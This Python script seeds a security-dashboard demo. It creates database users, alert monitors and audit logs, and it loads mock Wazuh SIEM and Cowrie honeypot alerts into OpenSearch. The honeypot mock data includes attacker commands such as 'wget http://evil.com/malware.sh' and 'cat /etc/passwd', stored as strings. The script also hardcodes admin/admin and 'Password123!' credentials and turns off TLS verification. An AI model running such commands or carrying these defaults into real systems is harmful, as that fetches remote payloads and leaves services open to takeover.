import asyncio
import httpx
from datetime import datetime, timedelta, timezone
import random
import uuid

# OpenSearch Configuration
OS_URL = "https://wazuh.indexer:9200"
OS_USER = "admin"
OS_PASS = "admin"
INDEX_NAME = f"wazuh-alerts-4.x-demo-{datetime.now().strftime('%Y.%m.%d')}"

# PostgreSQL Configuration
from sqlalchemy import select
from app.db import SessionLocal
from app.models import User, Ticket, AuditLog, IOC, Monitor, Runbook, SystemSetting, ChatMessage

async def populate_postgres():
    print("Populating PostgreSQL data...")
    async with SessionLocal() as db:
        # Add Users
        users = ["admin", "analyst1", "analyst2"]
        admin_user = None
        for u in users:
            res = await db.execute(select(User).where(User.username == u))
            user = res.scalar_one_or_none()
            if not user:
                from app.auth import get_password_hash
                user = User(
                    username=u,
                    email=f"{u}@valhalla.soc",
                    password_hash=get_password_hash("Password123!"),
                    role="admin" if u == "admin" else "analyst",
                    security_rank="Commander" if u == "admin" else "L1 Analyst"
                )
                db.add(user)
                await db.commit()
                await db.refresh(user)
            if u == "admin": admin_user = user

        # Add Monitors
        res = await db.execute(select(Monitor))
        if not res.scalars().first():
            db.add_all([
                Monitor(name="SSH Bruteforce", threshold=5, severity_floor="high", rule_id_pattern="5710,5712", is_active=True),
                Monitor(name="Web Attack Detection", threshold=10, severity_floor="high", rule_id_pattern="31103", is_active=True),
                Monitor(name="Malware Download", threshold=1, severity_floor="critical", rule_id_pattern="100001", is_active=True),
            ])
            await db.commit()

        # Add Audit Logs
        res = await db.execute(select(AuditLog))
        if not res.scalars().first() and admin_user:
            actions = ["Login successful", "Updated ticket #3", "Created Monitor", "Exported Executive Report"]
            for action in actions:
                db.add(AuditLog(
                    user_id=admin_user.id,
                    username=admin_user.username,
                    action=action,
                    ip_address="192.168.1.100",
                    route="/api/demo"
                ))
            await db.commit()
    print("PostgreSQL populated.")

async def populate_opensearch():
    print("Populating OpenSearch (Wazuh/Cowrie mock alerts)...")
    async with httpx.AsyncClient(auth=(OS_USER, OS_PASS), verify=False) as client:
        # Create index if not exists (ignore error if exists)
        await client.put(f"{OS_URL}/{INDEX_NAME}", json={
            "mappings": {
                "properties": {
                    "@timestamp": {"type": "date"},
                    "data.srcip": {"type": "keyword"},
                    "data.geoip.country_code2": {"type": "keyword"},
                }
            }
        })
        
        # Generate bulk data
        bulk_data = []
        now = datetime.now(timezone.utc)
        
        # 1. SIEM & Threat Map Alerts (SQL Injection, SSH Brute force)
        ips = ["45.33.32.156", "8.8.8.8", "1.1.1.1", "185.15.22.1"]
        countries = ["CN", "RU", "US", "IR"]
        for i in range(20):
            ts = (now - timedelta(minutes=random.randint(1, 1440))).isoformat()
            is_critical = random.choice([True, False])
            ip = random.choice(ips)
            cc = random.choice(countries)
            
            doc = {
                "@timestamp": ts,
                "rule": {
                    "id": "31103" if not is_critical else "5710",
                    "level": 6 if not is_critical else 12,
                    "description": "SQL Injection attempt detected" if not is_critical else "sshd: brute force trying to get access to the system.",
                    "groups": ["web", "attack", "sql_injection"] if not is_critical else ["syslog", "sshd", "authentication_failed"],
                    "mitre": {
                        "id": "T1190" if not is_critical else "T1110",
                        "tactic": "Initial Access",
                        "technique": "Exploit Public-Facing Application" if not is_critical else "Brute Force"
                    }
                },
                "agent": {
                    "id": "001",
                    "name": "SRV-WEB-01"
                },
                "data": {
                    "srcip": ip,
                    "geoip": {
                        "country_code2": cc,
                        "location": {"lat": 35.0, "lon": 105.0} if cc == "CN" else {"lat": 55.0, "lon": 37.0}
                    }
                },
                "full_log": "Mock log entry for demo purposes..."
            }
            bulk_data.append(f'{{"index": {{"_index": "{INDEX_NAME}"}}}}')
            bulk_data.append(str(doc).replace("'", '"'))

        # 2. Cowrie Honeypot Alerts
        for i in range(15):
            ts = (now - timedelta(minutes=random.randint(1, 1440))).isoformat()
            session = str(uuid.uuid4())[:8]
            ip = random.choice(ips)
            cmd = random.choice(["cat /etc/passwd", "wget http://evil.com/malware.sh", "uname -a", "whoami"])
            
            doc = {
                "@timestamp": ts,
                "rule": {
                    "id": "100001",
                    "level": 8,
                    "description": "Cowrie: Command Executed",
                    "groups": ["cowrie", "honeypot"]
                },
                "agent": {
                    "id": "002",
                    "name": "SRV-HONEYPOT"
                },
                "decoder": {"name": "cowrie"},
                "data": {
                    "srcip": ip,
                    "session": session,
                    "input": cmd,
                    "password": "password123",
                    "geoip": {"country_code2": "RU"}
                }
            }
            bulk_data.append(f'{{"index": {{"_index": "{INDEX_NAME}"}}}}')
            bulk_data.append(str(doc).replace("'", '"').replace("True", "true").replace("False", "false"))

        # Send bulk request
        bulk_str = "\n".join(bulk_data) + "\n"
        try:
            res = await client.post(
                f"{OS_URL}/_bulk",
                headers={"Content-Type": "application/x-ndjson"},
                content=bulk_str.encode("utf-8")
            )
            if res.status_code in [200, 201]:
                print(f"Successfully injected {len(bulk_data)//2} alerts into OpenSearch.")
                # Force refresh to make data immediately searchable
                await client.post(f"{OS_URL}/{INDEX_NAME}/_refresh")
            else:
                print(f"Failed to inject to OpenSearch: STATUS {res.status_code} - BODY {res.text}")
        except Exception as e:
            print(f"Exception during OpenSearch request: {e}")

async def main():
    await populate_postgres()
    await populate_opensearch()
    print("Done! All sections should now have data.")

if __name__ == "__main__":
    asyncio.run(main())
